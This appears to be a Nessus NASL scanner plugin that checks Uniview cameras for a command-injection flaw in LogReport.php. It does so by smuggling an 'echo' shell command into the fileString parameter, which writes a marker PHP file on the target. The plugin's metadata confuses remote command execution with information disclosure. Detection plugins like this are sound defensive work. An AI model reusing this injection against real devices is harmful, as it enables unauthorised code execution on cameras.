############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY  /opt/nessus/bin/nasl -k time172.18.253.11.kb -Xt 175.140.137.194  uniview_4-nessus.nasl
############################################################
include("compat.inc");


if (description)
{
  script_id(51799045);
  script_version("1.3");
  script_name(english:"Uniview camera device LogReport.php Remote Command Execution");
  script_summary(english:"Uniview camera device LogReport.php Information disclosure");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"description", value:"Uniview camera device LogReport.php Information disclosure");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Camera");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www", 80);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	url = string('/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20098f6bcd4621d373cade4e832627b4f6%20>%20rce_111.php');
	req = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"));
	if( "200 O" >!< req[0]) exit(0);
	req_find = http_send_recv3(method: "GET", port: port, item: "/Interface/LogReport/rce_111.php", add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"));
	if("200 O">< req_find[0] && '098f6bcd4621d373cade4e832627b4f6' >< req_find[2]){
	if (report_verbosity > 0) security_hole(port:port, extra:http_last_sent_request()+req_find[2]);
	    else security_hole(port);
        }
}

function check_vuln_ssl(port){
	url = string('/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20098f6bcd4621d373cade4e832627b4f6%20>%20rce_112.php');
	res = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"));
	req = http_last_sent_request();
	ssl_req = https_req_get(port:port , request:req);
	if( "200 O" >!< ssl_req) exit(0);
	reqs = http_get(item:"/Interface/LogReport/rce_112.php", port:port);
    ssl_reqs = https_req_get(request:reqs, port:port);
	if("200 O"><ssl_reqs && '098f6bcd4621d373cade4e832627b4f6' >< ssl_reqs){
		if (report_verbosity > 0) security_hole(port:port, extra:reqs+ssl_reqs);
	    else security_hole(port);
	    }
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
